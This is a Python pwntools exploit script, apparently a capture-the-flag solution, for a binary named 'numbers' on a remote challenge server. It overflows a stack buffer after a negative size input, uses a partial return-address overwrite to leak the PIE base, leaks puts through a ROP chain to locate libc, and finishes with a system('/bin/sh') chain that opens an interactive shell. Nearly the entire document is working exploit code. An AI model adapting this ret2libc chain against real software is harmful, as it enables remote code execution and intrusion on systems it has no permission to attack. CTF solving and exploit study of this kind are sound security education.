#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./numbers')
binary.symbols['main'] = 0x9c5
binary.symbols['entry'] = binary.symbols['main'] + 1
context.log_level = 'INFO'
context.log_file = 'log.log'

'''
# local libc
libc = binary.libc
'''
# task libc
libid = 'libc6_2.28-0ubuntu1_amd64'
libpath = os.getcwd() + '/libc-database/libs/' + libid + '/'
ld = ELF(libpath + 'ld-2.28.so')
libc = ELF(libpath + 'libc-2.28.so')
#'''

while True:
	#p = process(binary.path)
	#p = process([ld.path, binary.path], env={'LD_LIBRARY_PATH': libpath})
	#p = process([binary.path], env={'LD_LIBRARY_PATH': libpath})
	p = remote('numbers.fword.wtf', 1237)

	p.sendafter('do you have any number in mind ??\n','-1')
	payload  = 0x48 * b'A'
	payload += p16(binary.symbols['entry'] & 0xffff)
	p.sendafter('are yo sure ??\n',payload)

	_ = p.recv(0x48)
	if _ not in 0x48 * b'A':
		p.close()
		continue
	_ = p.recv(6)
	try:
		entry = u64(_ + b'\x00\x00')
	except:
		p.close()
		continue

	log.info('entry: ' + hex(entry))
	binary.address = entry & (2 ** 64 - 0x1000)
	log.info('binary.address: ' + hex(binary.address))
	log.info('entry: ' + hex(binary.sym.entry))

	try:
		p.sendafter('do you have any number in mind ??\n','-1')
		break
	except:
		p.close()
		continue

p.recvuntil('are yo sure ??\n')

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
log.info('pop_rdi: ' + hex(pop_rdi))

payload  = 0x48 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.symbols['entry'])

p.send(payload)

_ = p.recvuntil('do you ')[-15:][:6]
puts = u64(_ + b'\x00\x00')
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

p.sendafter('have any number in mind ??\n','-1')

payload  = 0x48 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

p.sendafter('sure ??\n',payload)
p.recv(len(payload))
p.interactive()
